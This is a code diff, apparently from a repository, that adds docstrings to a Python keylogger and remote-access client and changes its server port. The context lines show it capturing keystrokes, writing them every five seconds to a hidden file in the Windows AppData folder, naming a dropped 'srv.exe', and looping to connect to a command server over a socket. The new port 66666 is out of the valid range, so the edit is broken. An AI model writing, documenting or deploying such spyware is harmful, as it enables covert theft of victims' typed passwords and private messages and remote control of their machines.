@@ -12,13 +12,22 @@ import threading
 import pynput.keyboard
 
 server_ip = "localhost"
-server_port = 54321
+server_port = 66666
 file_location = os.environ["appdata"] + "\\srv.exe"
 image_file = "\\image.png"
 keylog_file = os.environ["appdata"] + "\\srv.txt"
 captured_keys = ""
 
 def process_keys(key):
+    """
+    Process the captured key and append it to the global variable `captured_keys`.
+
+    Parameters:
+    key (pynput.keyboard.Key): The key that was pressed.
+
+    Returns:
+    None
+    """
     global captured_keys
     try:
         captured_keys += str(key.char)
@@ -31,6 +40,10 @@ def process_keys(key):
             exit
 
 def write_keys():
+    """
+    Writes the captured keys to a file and clears the captured_keys variable.
+    Starts a timer to call the write_keys function again after 5 seconds.
+    """
     global captured_keys
     with open(keylog_file, "a") as kl_file:
         kl_file.write(captured_keys)
@@ -39,16 +52,41 @@ def write_keys():
     timer.start()
 
 def keylogger_start():
+    """
+    Starts the keylogger by creating a keyboard listener and joining it.
+    """
     keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
     with keyboard_listener:
         write_keys()
         keyboard_listener.join()
 
 def send_data(data):
+    """
+    Sends the provided data to the server.
+
+    Args:
+        data: The data to be sent.
+
+    Returns:
+        None
+    """
     json_data = json.dumps(data)
     s.send(bytes(json_data, encoding="utf-8"))
 
 def receive_data():
+    """
+    Receive data from the server.
+
+    This function receives data from the server by continuously receiving chunks of data
+    and appending them to a bytearray until a complete JSON object is received. It then
+    converts the JSON data to a Python object and returns it.
+
+    Returns:
+        dict: The received data as a Python dictionary.
+
+    Raises:
+        ValueError: If the received data is not a valid JSON object.
+    """
     json_data = bytearray()
     while True:
         try:
@@ -58,6 +96,19 @@ def receive_data():
             continue
 
 def establish_connection():
+    """
+    Establishes a connection with the server and handles communication.
+
+    This function continuously tries to establish a connection with the server
+    specified by `server_ip` and `server_port`. Once the connection is established,
+    it calls the `handle_communication` function to handle the communication with the server.
+
+    If an exception occurs during the connection attempt, the function sleeps for 20 seconds
+    before trying again.
+
+    Note: Make sure to set the values of `server_ip` and `server_port` before calling this function.
+
+    """
     while True:
         try:
             s.connect((server_ip, server_port))
